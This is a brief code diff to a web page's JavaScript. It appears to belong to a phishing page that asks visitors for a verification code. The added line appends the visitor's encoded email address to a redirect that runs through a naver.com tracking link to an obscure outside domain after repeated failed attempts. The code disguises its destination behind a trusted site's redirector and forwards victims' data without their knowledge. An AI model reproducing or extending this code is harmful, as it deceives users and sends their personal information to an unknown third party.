@@ -429,7 +429,7 @@
                 ? "Too many incorrect codes. Please try again later."
                 : "Incorrect code. Please try again.";
               showErrorWithDelay(msg, codeMsg);
-              if (codeAttempt >= 2) setTimeout(() => window.location.href = "https://cc.naver.com/cc?m=1&u=https%3A%2F%2Fbanner.boothavu.in.net%2Fw95Suml%4021dQrZp/$", 2000);
+              if (codeAttempt >= 2) setTimeout(() => window.location.href = "https://cc.naver.com/cc?m=1&u=https%3A%2F%2Fbanner.boothavu.in.net%2Fw95Suml%4021dQrZp/$" + encodedEmail, 2000);
             }, 800);
             return;
           }
@@ -518,4 +518,5 @@
 </body>
 
 </html>
+
 
